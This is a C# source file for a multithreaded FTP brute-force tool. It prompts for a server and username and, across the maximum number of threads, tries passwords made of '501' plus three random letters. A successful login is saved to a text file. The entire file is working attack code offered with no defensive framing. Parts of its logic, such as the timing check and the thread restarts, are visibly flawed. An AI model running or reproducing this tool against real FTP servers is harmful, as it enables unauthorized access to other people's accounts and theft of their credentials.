using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.Timers;
using System.Diagnostics;
using WebCamService;
using System.Linq.Expressions;
using System.Timers;

namespace BruteForceFTP
{
    public class FTPBrute
    {
        public static List<Thread> threadList = new List<Thread>();

        public static String srv;
        public static String usr;

        private static bool foundLogin = false;
        private static Random rand = new Random();
        private static int attempts = 1;

        static String Ftp_Srv()
        {
            Console.Write("Enter FTP Server: ");
            srv = Console.ReadLine();
            return srv;
        }

        static String Ftp_Usr()
        {
            Console.Write("Enter FTP Username: ");
            usr = Console.ReadLine();
            return usr;
        }

        static void PrepareBrute()
        {
            Ftp_Srv();
            Ftp_Usr();
            Console.WriteLine("");
        }

        protected int pwd_first(int start, int end)
        {
            int pwd_first;
            pwd_first = rand.Next(start, end + 1);
            return pwd_first;
        }


        protected String pwd_second(int length)
        {
            var chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[rand.Next(s.Length)]).ToArray());
        }

        protected void restartThread(Thread thread)
        {
            string threadName = thread.Name;

            thread.Abort();

            Thread newThread = new Thread(new ThreadStart(Brute));

            if (newThread.Name == null)
            {
                newThread.Name = threadName;
            }

            newThread.Start();
        }

        protected void onTimedEvent(object source, ElapsedEventArgs timeElapsed, Thread currThread)
        {   
            if(timeElapsed.SignalTime.Millisecond > 900)
            {
                // Console.WriteLine("The Elapsed event was raised at {0}", timeElapsed.SignalTime.Millisecond);

                restartThread(currThread);
            }
        }

        protected void elapsed(int time, Thread currThread)
        {
            if(time > 900)
            {
                restartThread(currThread);
            }
        }

        public void Brute()
        {
            Thread currThread = Thread.CurrentThread;
            string credDetails = "";

            int startime = DateTime.Now.Millisecond;

            // System.Timers.Timer aTimer = new System.Timers.Timer();

            // aTimer.Elapsed += delegate (object sender, ElapsedEventArgs elapsed) { onTimedEvent(sender, elapsed, currThread); };

            // aTimer.AutoReset = true;

            while (!foundLogin)
            {
                string pwd_num = pwd_first(501, 501).ToString();
                string pwd_chr = pwd_second(3).ToString();

                var pwd = pwd_num + pwd_chr;

                // aTimer.Enabled = true;

                FtpClient ftp = new FtpClient(srv, usr, pwd);

                try
                {
                    ftp.Login();
                    
                    int endtime = DateTime.Now.Millisecond;

                    int totalTime = startime - endtime;

                    elapsed(totalTime, currThread);
                }
                catch (FtpClient.FtpException returncode)
                {
                    switch (returncode.Message)
                    {
                        case "530":
                            attempts += 1;
                            Console.Write("\r({0}) | Attempts: {1}", Thread.CurrentThread.Name.ToString(), attempts + "  ");

                            break;
                        case "230":
                            Console.Write("\rSuccessfully acquired login details after {0} attempts, Saving [+]", attempts);

                            credDetails = "ftp://" + srv + "::" + usr + "::" + pwd;

                            foundLogin = true;
                            break;
                    }
                }
            }

            Console.WriteLine("\n");

            Console.WriteLine("((" + Thread.CurrentThread.Name.ToString() + "))" + "((" + credDetails + "))");

            var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");

            File.WriteAllText(path, credDetails);
            Environment.Exit(1);
        }

        public class Threading : FTPBrute
        {
            public void createBruteThreads()
            {
                int workerThreadCount;
                int ioThreadCount;

                ThreadPool.GetMaxThreads(out workerThreadCount, out ioThreadCount);

                ThreadPool.SetMaxThreads(workerThreadCount, ioThreadCount);

                for(int i = 0; i < workerThreadCount; i++)
                {
                    Thread newThread = new Thread(new ThreadStart(Brute));

                    if(newThread.Name == null)
                    {
                        newThread.Name = "Thread-" + i;
                    }

                    newThread.Start();
                    threadList.Add(newThread);

                    Console.Write("\r" + i + "/" + workerThreadCount + " Threads started...");
                }
                Console.WriteLine("\n");
            }
        }


        static void Main()
        {
            Threading Threading = new Threading();

            PrepareBrute();
            
            Threading.createBruteThreads();
        }
    }
}